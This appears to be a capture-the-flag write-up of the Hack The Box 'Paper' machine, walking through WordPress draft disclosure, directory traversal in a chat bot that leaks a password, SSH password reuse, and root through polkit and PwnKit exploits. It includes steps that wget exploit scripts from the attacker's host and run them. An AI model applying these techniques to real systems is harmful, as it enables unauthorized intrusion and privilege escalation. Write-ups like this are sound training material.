---
title: HTB: Paper
url: https://0xdf.gitlab.io/2022/06/18/htb-paper.html
date: 2022-06-18T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, ctf, htb-paper, nmap, feroxbuster, wfuzz, vhosts, wordpress, wpscan, rocket-chat, cve-2019-17671, directory-traversal, password-reuse, credentials, crackmapexec, linpeas, cve-2021-3156, cve-2021-4034, pwnkit, cve-2021-3650, oscp-like-v2
---

![Paper](https://0xdfimages.gitlab.io/img/paper-cover.png)

Paper is a fun easy-rated box themed off characters from the TV show “The Office”. There’s a WordPress vulnerability that allows reading draft posts. In a draft post, I’ll find the URL to register accounts on a Rocket Chat instance. Inside the chat, there’s a bot that can read files. I’ll exploit a directory traversal to read outside the current directory, and find a password that can be used to access the system. To escalate from there, I’ll exploit a 2021 CVE in PolKit. In Beyond Root, I’ll look at a later CVE in Polkit, Pwnkit, and show why Paper wasn’t vulnerable, make it vulnerable, and exploit it.

## Box Info

| Name | [Paper](https://hackthebox.com/machines/paper)  [Paper](https://hackthebox.com/machines/paper) [Play on HackTheBox](https://hackthebox.com/machines/paper) |
| --- | --- |
| Release Date | [05 Feb 2022](https://twitter.com/hackthebox_eu/status/1488905180519317509) |
| Retire Date | 18 Jun 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Paper |
| Radar Graph | Radar chart for Paper |
| First Blood User | 00:23:52[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:29:19[Ziemni Ziemni](https://app.hackthebox.com/users/12507) |
| Creator | [secnigma secnigma](https://app.hackthebox.com/users/92926) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.143
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-04 17:59 UTC
Nmap scan report for 10.10.11.143
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 7.78 seconds
oxdf@hacky$ nmap -p 22,80,443 -sCV 10.10.11.143
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-04 17:59 UTC
Nmap scan report for 10.10.11.143
Host is up (0.090s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds

```

Based on the [Apache version](https://access.redhat.com/solutions/445713), the host is likely running Centos 8. There’s a TLS certificate, but it just has `localhost.localdomain`, which isn’t interesting. The HTTP port and the HTTPS port seem to be the same.

### Website - TCP 80/443

#### Site

Both the HTTP and HTTPS sites just show a default CentOs Apache Page:

[![image-20220604163635047](https://0xdfimages.gitlab.io/img/image-20220604163635047.png)](https://0xdfimages.gitlab.io/img/image-20220604163635047.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220604163635047.png)

#### Tech Stack

Surprisingly, the default page doesn’t load as `index.html` on either port. One interesting note is that that default page is coming back with an HTTP 403 Forbidden response (and not a 200 OK). Not sure that means anything, but interesting.

The headers on 443 don’t give any additional information either. But there’s an extra header on 80:

```

HTTP/1.1 403 Forbidden
Date: Sat, 04 Jun 2022 20:42:12 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Connection: close
Content-Type: text/html; charset=UTF-8

```

`X-Backend-Server` is a non-standard header, and it’s leaking a domain name, `office.paper`.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and it finds `/manual`, but nothing else. `/manual` is an Apache default page:

[![image-20220605113210026](https://0xdfimages.gitlab.io/img/image-20220605113210026.png)](https://0xdfimages.gitlab.io/img/image-20220605113210026.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220605113210026.png)

### Subdomain Fuzz

Knowing that there are different DNS names in use, I’ll fuzz for subdomains using `wfuzz`. I’ll start this without any filtering, and see the the default case is 199691 characters. I’ll kill it, and restart with `--hh 199691`. It finds one additional subdomain:

```

oxdf@hacky$ wfuzz -u http://office.paper -H "Host: FUZZ.office.paper" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 199691
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://office.paper/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000070:   200        507 L    13015W   223163 Ch   "chat"

Total time: 668.9470
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 7.457989

```

I’ll add `chat.office.paper` to my `/etc/hosts` file as well.

### office.paper - TCP 80

#### Site

The HTTPS site for `office.paper` returns the same default page. But the HTTP site has a new page for a paper company, Blunder Tiffin:

![image-20220605113359028](https://0xdfimages.gitlab.io/img/image-20220605113359028.png)

This is a clearly a play on the company from the TV show “[The Office](https://www.imdb.com/title/tt0386676/)”, which focuses on a paper company called Dunder Mifflin.

There are three posts, all by Prisonmike, and all a similar character to the dumb boss like on the TV show. There is one comment on one of the posts that has a hint:

![image-20220605113813775](https://0xdfimages.gitlab.io/img/image-20220605113813775.png)

I’ll make sure to check out draft posts if I can find access.

#### Tech Stack

The bottom of the page says in very dark letters “Proudly Powered By WordPress”. The HTTP response headers also contain WordPress references:

```

HTTP/1.1 200 OK
Date: Sun, 05 Jun 2022 15:40:28 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Powered-By: PHP/7.2.24
Link: <http://office.paper/index.php/wp-json/>; rel="https://api.w.org/"
X-Backend-Server: office.paper
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 23849

```

#### wpscan

I’ll run `wpscan` to identify WordPress issues using `wpscan --url http://office.paper --api-token $WPSCAN_API`. To scan for vulnerabilities, I need to use an API token, which I got for free at the [wpscan site](https://wpscan.com/wordpress-security-scanner). I store my API token in the Bash environment variable `$WPSCAN_API` with this line in my `~/.bashrc` file:

```

export WPSCAN_API=[redacted]

```

`wpscan` finds the WP version is 5.2.3:

```

...[snip]...
[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |
 | [!] 32 vulnerabilities identified:
...[snip]...

```

There are 32 known vulnerabilities in this version, but one towards the top jumps out given the mention of drafts earlier:

```

 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2                          
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/

```

I’ll exploit this one below.

### chat.office.paper - TCP 80

This site is an instance of [rocket.chat](https://rocket.chat/), and open source communications platform:

![image-20220605124740432](https://0xdfimages.gitlab.io/img/image-20220605124740432.png)

Under the login button there’s a custom bit of text that says the registration URL is hidden.

I’ll try some basic credendial guessing, but nothing logs in. I don’t see any interesting vulnerabilities in rocket.chat.

## Shell as dwight

### Access rocket.chat

#### CVE-2019-17671

[This post](https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/) breaks down how vulnerable WordPress versions could be exploited via CVE-2019-17671 to view draft, password protected, and private posts. It’s a mistake in how WordPress handles displaying a mix of draft and published posts when viewed with `?static=1`. The if the first post returned is public, then all the posts will be dumped to the page. There are ways to reorder the result, but here it just works without any additional tricks by visiting `http://office.paper/?static=1`:

![image-20220605125451674](https://0xdfimages.gitlab.io/img/image-20220605125451674.png)

There is a private link to access rocket chat registration.

#### Register for Chat

At that link, it provides a registration form:

![image-20220605125626426](https://0xdfimages.gitlab.io/img/image-20220605125626426.png)

The next page asks me to pick a username:

![image-20220605125644551](https://0xdfimages.gitlab.io/img/image-20220605125644551.png)

And on clicking “Use this username” I’m in the chat:

![image-20220605125734188](https://0xdfimages.gitlab.io/img/image-20220605125734188.png)

### recyclops

#### Discover

The `#general` channel has a bunch of characters from the TV show, and some good jokes, but also a bit about Dwight programming a bot:

![image-20220605130816342](https://0xdfimages.gitlab.io/img/image-20220605130816342.png)

The most interesting points:
- `recyclops help` will show the commands
- recyclops can get files and list files
- this channel is read only
- recyclops can be reached by DM (direct message).

#### Listing Files

I’ll open a DM to recyclops, and try to list files:

![image-20220605131142761](https://0xdfimages.gitlab.io/img/image-20220605131142761.png)

It shows the contents of `/sales/`. If I give it a valid directory, it returns the contents of that directory. But if I give it an invalid path, it errors, and gives the full path:

![image-20220605131251132](https://0xdfimages.gitlab.io/img/image-20220605131251132.png)

This command is vulnerable to directory traversal:

![image-20220605131501215](https://0xdfimages.gitlab.io/img/image-20220605131501215.png)

It seems hardened against command injection:

![image-20220605131538877](https://0xdfimages.gitlab.io/img/image-20220605131538877.png)

#### Read Files

The bot can show file content:

![image-20220605133028301](https://0xdfimages.gitlab.io/img/image-20220605133028301.png)

The directory traversal vulnerability is present in this command as well. `file ../../../etc/passwd` shows the contents of that file:

![image-20220605132938566](https://0xdfimages.gitlab.io/img/image-20220605132938566.png)

I’ll note that dwight and rocketchat are the only users on the box not in the system/service range below 1000.

#### Leak Credentials

In `../hubot` there’s a NodeJS project:

![image-20220605133200037](https://0xdfimages.gitlab.io/img/image-20220605133200037.png)

The `.env` file is immediately interesting, as those files tend to hold secrets for the project:

![image-20220605133232357](https://0xdfimages.gitlab.io/img/image-20220605133232357.png)

There’s a password, “Queenofblad3s!23”.

### SSH

Given the access to files in `/home/dwight`, it makes sense that the bot is running as dwight. It’s worth checking if dwight shared their password across rocketchat and the system. `crackmapexec` shows it works:

```

oxdf@hacky$ crackmapexec ssh 10.10.11.143 -u dwight -p 'Queenofblad3s!23'
SSH         10.10.11.143    22     10.10.11.143     [*] SSH-2.0-OpenSSH_8.0
SSH         10.10.11.143    22     10.10.11.143     [+] dwight:Queenofblad3s!23 

```
*Note: It’s important to put that password in single quotes and not double quotes, or Bash will interpret `!23` as the command run 23 commands ago in the current sessions history.*

SSH works to get a shell:

```

oxdf@hacky$ sshpass -p 'Queenofblad3s!23' ssh dwight@10.10.11.143
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Sun Jun  5 13:34:39 EDT 2022 from 10.10.14.6 on ssh:notty
There was 1 failed login attempt since the last successful login.
Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$

```

And `user.txt`:

```

[dwight@paper ~]$ cat user.txt
9e780dce************************

```

## Shell as root

### LinPEAS

In general, I like to enumeration manually before breaking out enumeration scripts because it provides good practice of knowing the things to look for. That said, on this one, after a looking around on my own, I didn’t see much of interest.

#### Build

I could grab the latest release from the [releases page](https://github.com/carlospolop/PEASS-ng/releases), but there’s also a builder I can use. I’ll clone the repo onto my computer (`git clone https://github.com/carlospolop/PEASS-ng`), and then go into the `PEASS-ng/linPEAS` directory.

```

oxdf@hacky$ ls
builder  images  README.md

```

From there, I’ll call the builder script with `python3 -m builder.linpeas_builder`. This is going to run `linpeas_builder` from the `builder` directory, which builds a `.sh` script:

```

oxdf@hacky$ python -m builder.linpeas_builder
[+] Building temporary linpeas_base.sh...
[+] Building variables...
[+] Building finds...
[+] Building storages...
[+] Checking duplicates...
[+] Building autocheck sections...
[+] Building regexes searches...
[+] Building linux exploit suggesters...
[+] Building GTFOBins lists...
[+] Final sanity checks...
oxdf@hacky$ 
oxdf@hacky$ ls
builder  images  linpeas.sh  README.md

```

I’ll start a webserver (`python3 -m http.server 80`) in that directory, and then fetch it from Paper with `wget` (working out of `/dev/shm` as a temp directory):

```

[dwight@paper shm]$ wget 10.10.14.6/linpeas.sh
--2022-06-05 14:16:30--  http://10.10.14.6/linpeas.sh
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776776 (759K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                           100%[=================================>] 758.57K  1.17MB/s    in 0.6s    

2022-06-05 14:16:31 (1.17 MB/s) - ‘linpeas.sh’ saved [776776/776776]

```

#### Results

I’ll run `linpeas` with `bash linpeas.sh`. Right at the top of the output under “System Information”, it says the system is vulnerable to CVE-2021-3560:

```

                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021
lsb_release Not Found

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version   
Sudo version 1.8.29

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560   

```

A bit further there, there’s a section from “Linux Exploit Suggester”

```

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt   
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
...[snip]...

```

There are three more, but they each have comments that say specific configurations need to be enabled on the system for them to work. So I’ll start with these.

Looking through the rest of the output, there’s not a ton that jumped out as interesting.

### Baron Samedit - Fail

CVE-2021-3156 is a heap-based buffer overflow vulnerability in `sudo`, referred to as Baron Samedit. This vulnerability was discovered by researchers at Qualys, and they have a very thorough [blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit) about it.

The vulnerability was patched very quickly, but one annoying feature about the patch is that it didn’t update the version number for `sudo` or any other binary. So it’s not possible to tell definitively if a version if vulnerable or not just by version number.

To check, you run `sudoedit -s /`. If this returns an error message `sudoedit: /: not a regular file`, then it’s vulnerable. If it returns the `sudoedit` usage, it’s not. Paper is not vulnerable:

```

[dwight@paper shm]$ sudoedit -s /
usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...

```

### PwnKit - Fail

CVE-2021-4034 is another bug discovered by Qualys, this time in `pkexec`, which is referred to as PwnKit. [This blog post](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) goes into all the detail. The exploit abuses a mishandling of an empty `argc` (where parameters are passed into a Linux program) to get execution through `pkexec` which runs as root (via SetUID) by default.

The version of `pkexec` on Paper is likely vulnerable to this exploit, but there’s an issue:

```

[dwight@paper shm]$ ls -l /usr/bin/pkexec 
-rwxr-xr-x. 1 root root 29816 May 11  2019 /usr/bin/pkexec

```

`pkexec` isn’t set as SetUID, and thus, exploiting it will only return execution as the user that runs it, which isn’t useful.

### Polkit CVE

CVE-2021-3650 is a vulnerability in polkit discovered by Keven Backhouse of the [GitHub Security Lab](https://securitylab.github.com/). This attack is a timing attack against polkit, and by killing the process at the right time, it ends up skipping the authentication and allow actions such as creating an account with `sudo` privs and setting the password..

The author of Paper happens to have a [script](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) for this exploit on their GitHub. I’ll save a copy on my VM, and start a webserver in that directory (`python3 -m http.server 80`). Then I’ll fetch the script with `wget` to Paper:

```

[dwight@paper shm]$ wget 10.10.14.6/cve-2021-3650.sh
--2022-06-05 15:25:11--  http://10.10.14.6/cve-2021-3650.sh
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9627 (9.4K) [text/x-sh]
Saving to: ‘cve-2021-3650.sh’

cve-2021-3650.sh                                     100%[=================================>]    9.40K  --.-KB/s    in 0.005s  

2022-06-05 15:25:11 (1.91 MB/s) - ‘cve-2021-3650.sh’ saved [9627/9627]

```

Now I just run it:

```

[dwight@paper shm]$ bash cve-2021-3650.sh

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was successful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was successful,simply enter 'sudo bash' and drop into a root shell!

```

It might not work every time, but running it repeatedly will eventually work. I’ll change user to the secnigma user with the password secnigmaftw (from the `README.md` on GitHub):

```

[dwight@paper shm]$ su - secnigma
Password: 
[secnigma@paper ~]$

```

Now this user is in the `wheel` group:

```

[secnigma@paper ~]$ id
uid=1005(secnigma) gid=1005(secnigma) groups=1005(secnigma),10(wheel)

```

This group [allows members](https://unix.stackexchange.com/a/152445/369627) to run `sudo`. I’ll need the password again, but it works:

```

[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma: 
[root@paper secnigma]#

```

And I can get the final flag:

```

[root@paper ~]# cat root.txt
1f6cdd61************************

```

## Beyond Root - Revisiting PwnKit

### Verify Failure

On noticing that `pkexec` was not SetUID, I gave up on PwnKit and moved to other things (which is a reasonable thing to do). I wanted to come back and play with that now that I have root access.

I’ll grab a POC pretty much at random (I’m going with [this one](https://github.com/luijait/PwnKit-Exploit/blob/main/exploit.c) by luijait). I’ll save a copy of `exploit.c` on Paper and then compile it:

```

[dwight@paper shm]$ cc -Wall exploit.c -o exploit
[dwight@paper shm]$ ls -l
total 28
-rwxrwxr-x 1 dwight dwight 21992 Jun  5 16:15 exploit
-rw-rw-r-- 1 dwight dwight  1547 Jun  5 16:15 exploit.c

```

I run it, and it complains that “pkexec must be setuid root”:

```

[dwight@paper shm]$ ./exploit 
Current User before execute exploit
hacker@victim$whoami: dwight
Exploit written by @luijait (0x6c75696a616974)
[+] Enjoy your root if exploit was completed successfully
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
pkexec must be setuid root

```

### Re-SetUID pwnkit

As root, I’ll change `pkexec` back to SetUID permissions:

```

[root@paper ~]# chmod 4755 /usr/bin/pkexec
[root@paper ~]# ls -l /usr/bin/pkexec
-rwsr-xr-x. 1 root root 29816 May 11  2019 /usr/bin/pkexec

```

Back in the shell as dwight, I’ll try the exploit again:

```

[dwight@paper shm]$ ./exploit 
Current User before execute exploit
hacker@victim$whoami: dwight
Exploit written by @luijait (0x6c75696a616974)mkdir: cannot create directory ‘GCONV_PATH=.’: File exists

[+] Enjoy your root if exploit was completed successfully
[root@paper shm]#

```

It works and returns a root shell.